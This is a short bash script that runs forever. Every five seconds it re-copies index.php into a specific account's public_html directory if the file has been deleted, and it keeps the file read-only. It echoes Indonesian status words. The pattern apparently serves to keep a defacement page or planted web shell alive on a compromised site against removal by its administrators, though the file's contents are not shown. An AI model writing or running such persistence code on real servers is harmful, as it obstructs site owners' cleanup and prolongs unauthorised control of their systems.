#!/bin/bash
file="index.php"
lok="/home/u1008463/public_html/"

while true
do
    if [ -f $lok$file ]; then
        chmod 444 $lok$file
        echo "ada"
    else
        cp $file $lok$file
        chmod 444 $lok$file
        echo "ilang"
    fi
    sleep 5 # 5s = 5 second
done
